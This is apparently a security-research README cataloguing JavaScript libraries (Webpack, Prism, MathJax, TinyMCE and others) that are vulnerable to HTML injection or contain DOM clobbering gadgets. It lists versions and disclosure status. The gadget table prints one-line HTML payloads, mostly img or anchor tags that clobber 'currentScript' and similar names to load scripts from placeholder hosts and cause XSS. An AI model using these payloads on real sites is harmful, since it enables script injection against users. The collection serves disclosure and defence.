# DOM Clobbering Collection

In this repo, we collect a list of client-side libraries that are either vulnerable to HTML injection or contain DOM Clobbering gadgets that lead to severe consequences, e.g., XSS.

## HTML Injection Vulnerabilities

| Library | Stars | Version | Input | Sanitizer | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Capability &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | Status | CVE |
|:-------:|:-----:|:-------:|-------|:---------:|-------------------------|:------:|:---:|
| [Froala](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/froala.md) | 5.3K | v4.2.2 | Copy&Paste | DOMPurify | Any Tag & Any `name` attributes | N/A | N/A |
| [RichTextEditor](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/richtexteditor.md) | N/A | Latest | Copy&Paste | N/A | Any Tag & Any named property | N/A | N/A |
| [TinyMCE-v5/6/7](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/tinymce.md) | 14.9K | v7.3.0 | Copy&Paste | DOMPurify | Any Tag & Any named property without collision | N/A | N/A |
| [TinyMCE-v4](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/tinymce4.md) | 14.9K | v4.9.11 | Copy&Paste | N/A | Any Tag & Any named property | N/A | N/A |

## DOM Clobbering Gadgets

| Library | Stars | Version | Payloads | Impact | Found By | Status | CVE |
|:-------:|:-----:|:-------:|----------|:------:|:--------:|:------:|:---:|
| [AddToAny](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/addtoany.md) | N/A | N/A | ```<img src="https://addtoany.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Patched | N/A |
| [doomcaptcha](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/doomcaptcha.md) | 1K | latest | ```<img name="currentScript" label="<script>alert(1)</script>"></img>``` | XSS | TheHulk | Mitre | N/A |
| [Google Client API](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-client-api.md) | N/A | 5BIk7BglYEE | ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”></iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert(1)</iframe>``` | XSS | TheHulk | Patched | N/A |
| [Google Closure](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/google-closure-library.md) | 4.9K | v20230103 | ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>``` | XSS | TheHulk | Accepted | N/A |
| [inspire.js](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/inspire.js.md) | 1.7k | v1.10 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
| [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax2.md) | 10.1K | v2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | Accepted | N/A |
| [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax3.md) | 10.1K | v3.2.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk | Accepted | N/A |
| [Mavo](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mavo.md) | 2.8K | v0.3.2 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
| [pagefind](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/pagefind.md) | 3.3K | v1.1.0 | ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>``` | XSS | TheHulk | Reported | N/A |
| [polyfills](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/polyfills.md) | 1.1K | v2.8.0 | ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | N/A | N/A |
| [Prism](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/prism.md) | 12.2K | v1.29.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>``` | XSS | TheHulk | Reported | N/A |
| [rspack](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/rspack.md) | 8.6K | v1.0.0-rc.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | N/A | N/A |
| [squirt](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/squirt.md) | 1.2K | v0.0.1 | ```<img name="scripts" src="http://xxx.xxx.xxx"><img name="scripts" src="http://xxx.xxx.xxx">``` | XSS | TheHulk | N/A  | N/A |
| [Stage.js](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/stage.js.md) | 2.4K | v1-alpha | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
| [steal](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>``` | XSS | TheHulk | Mitre | N/A |
| [tsup](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/tsup.md) | N/A | N/A | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | N/A | N/A |
| [UMeditor](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/umeditor.md) | 1.4K | v1.2.2 | ```<a id="UMEDITOR_HOME_URL" href="https://xxx.xxx.xxx/"></a>``` | XSS | TheHulk | Reported | N/A |
| [Webpack](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/webpack.md) | 64.4K | v5.93.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Patched | CVE-2024-XXXXX |
